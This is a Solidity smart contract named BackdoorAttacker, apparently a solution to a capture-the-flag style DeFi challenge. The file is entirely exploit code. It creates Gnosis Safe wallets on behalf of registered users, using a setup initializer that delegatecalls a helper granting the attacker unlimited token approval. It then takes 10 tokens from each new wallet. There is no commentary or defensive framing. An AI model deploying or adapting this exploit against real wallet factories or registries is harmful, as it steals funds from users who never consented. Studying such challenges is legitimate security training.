// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

contract BackdoorAttacker {
    address registry;
    IERC20 token;
    GnosisSafeProxyFactory factory;

    constructor(
        address _registry,
        IERC20 _token,
        GnosisSafeProxyFactory _factory
    ) {
        registry = _registry;
        token = _token;
        factory = _factory;
    }

    function attack(address[] calldata users, address singleton) external {
        for (uint256 i = 0; i < users.length; i++) {
			address[] memory owners = new address[](1);
            owners[0] = users[i];
            bytes memory initializer = abi.encodeWithSelector(
				0xb63e800d,
                owners,
                1,
                address(this),
                abi.encodeWithSelector(0xc8bdae9b, address(token), address(this)),
                address(0),
                0,
                address(0),
                address(0)
            );
            GnosisSafeProxy proxy = factory.createProxyWithCallback(
                singleton,
                initializer,
                0,
                IProxyCreationCallback(registry)
            );
			token.transferFrom(address(proxy), msg.sender, 10 ether);
        }
    }

	function badApprove(address _token, address _to) external {
		IERC20(_token).approve(_to, type(uint256).max);
	}
}
